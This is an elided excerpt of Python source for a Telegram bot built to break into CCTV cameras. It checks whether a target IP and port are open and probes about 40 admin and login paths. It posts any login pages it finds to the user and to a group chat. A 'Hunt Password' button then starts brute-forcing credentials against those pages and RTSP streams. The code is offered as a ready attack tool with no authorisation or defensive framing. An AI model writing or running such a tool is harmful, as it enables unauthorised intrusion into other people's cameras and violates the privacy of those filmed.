...
# Expanded to 40 admin/login paths
ADMIN_PATHS = [
    ...
    "/login.html", "/sysadmin", "/webadmin", "/adminarea", "/backend", "/console",
    "/admin/index", "/login.aspx", "/admin/login.php", "/controlpanel", "/adminarea/login",
    "/admincp", "/moderator", "/account/login", "/system/login", "/admin/auth",
    "/login/admin", "/admin/console", "/manage/login", "/siteadmin", "/admin/dashboard"
]
...
async def help_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    await query.message.reply_text(
        ...
        "3. I'll check for open ports and scan 40+ admin paths with live updates.\n"
        "4. Admin pages found are sent instantly; use 'Hunt Password' to brute-force credentials.\n"
...
async def port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    ...
    results, potential_links, admin_pages, progress_message = await hack_cctv(ip, port, update, context)

    # Add Hunt Password button if there are links or admin pages
    keyboard = []
    if potential_links or admin_pages:
        keyboard.append([InlineKeyboardButton("Hunt Password", callback_data=f"hunt_{ip}_{port}")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(results, reply_markup=reply_markup)

    # Send admin page links summary if detected
    if admin_pages:
    ...
    try:
        await context.bot.edit_message_text(
            ...
            text=f"✅ Scan Complete! Checked {len(ADMIN_PATHS)}/{len(ADMIN_PATHS)} paths",
            reply_markup=None
        )
    except Exception as e:
...
async def hack_cctv(ip: str, port: int, update: Update, context: ContextTypes.DEFAULT_TYPE) -> tuple[str, list, list, object]:
    """Perform initial CCTV scan, check for login/admin pages with live updates, and return potential RTSP links."""
    results = [f"📡 Scanning {ip}:{port}..."]
    potential_links = []
    admin_pages = []

    # Send initial progress message with inline button
    progress_keyboard = [[InlineKeyboardButton(f"Scanning: 0/{len(ADMIN_PATHS)} paths", callback_data="progress")]]
    progress_message = await update.message.reply_text(
        f"Scanning admin paths: 0/{len(ADMIN_PATHS)}",
        reply_markup=InlineKeyboardMarkup(progress_keyboard)
    )

    # Check if port is open
    if not await check_port(ip, port):
        results.append("❌ Port closed or unreachable.")
        return "\n".join(results), potential_links, admin_pages, progress_message
    ...
    # Try to detect camera model and login/admin pages via HTTP
    ...
    if service == "http":
        try:
                ...
                for i, path in enumerate(ADMIN_PATHS, 1):
                    async with session.get(f"http://{ip}:{port}{path}", timeout=5) as response:
                        if response.status == 200:
                            ...
                            # Check for login/admin page
                            if any(keyword in html.lower() for keyword in ["username", "password", "<form", "login", "admin", "dashboard"]):
                                admin_url = f"http://{ip}:{port}{path}"
                                admin_pages.append(admin_url)
                                # Send immediate message for found admin page
                                await update.message.reply_text(
                                    f"✅ **Detected Admin/Login Page** 🎯: {admin_url}",
                                    parse_mode="Markdown"
                                )
                                # Send to group chat
                                try:
                                    await context.bot.send_message(
                                        ...
                                        text=f"🎯 Found admin page for {ip}:{port}!\nURL: {admin_url}",
                                        parse_mode="Markdown"
                                    )
                                except Exception as e:
                                    logger.error(f"Error sending to group: {e}")
                            else:
                                results.append(f"✅ Open Path: http://{ip}:{port}{path} (No admin/login page)")
                        else:
                            results.append(f"❌ Path http://{ip}:{port}{path} (status: {response.status})")

                        # Update progress every 5 paths
                        if i % 5 == 0 or i == len(ADMIN_PATHS):
                            progress_percent = (i / len(ADMIN_PATHS)) * 100
                            try:
                                await context.bot.edit_message_text(
                                    chat_id=progress_message.chat_id,
                                    message_id=progress_message.message_id,
                                    text=f"Scanning admin paths: {i}/{len(ADMIN_PATHS)} ({progress_percent:.0f}%)",
                                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"Scanning: {i}/{len(ADMIN_PATHS)} paths", callback_data="progress")]])
                                )
                            except Exception as e:
            ...
            results.append(f"❌ Error checking paths: {str(e)}")
    ...
    # Final result
    if potential_links or admin_pages:
        results.append("🎉 Scan Successful! Check detected admin pages or use 'Hunt Password' to brute-force credentials!")
    else:
...
async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Hunt Password button, brute-force credentials with live progress."""
    query = update.callback_query
    await query.answer()
    ...
    if not (potential_links or admin_pages):
        await query.message.reply_text("No RTSP links or admin pages to brute-force. Run /start again.")
        return
    ...
    if admin_pages:
        for admin_url in admin_pages:
            if not context.user_data.get("brute_force_running", False):
                break
            path = admin_url.replace(f"http://{ip}:{port}", "")
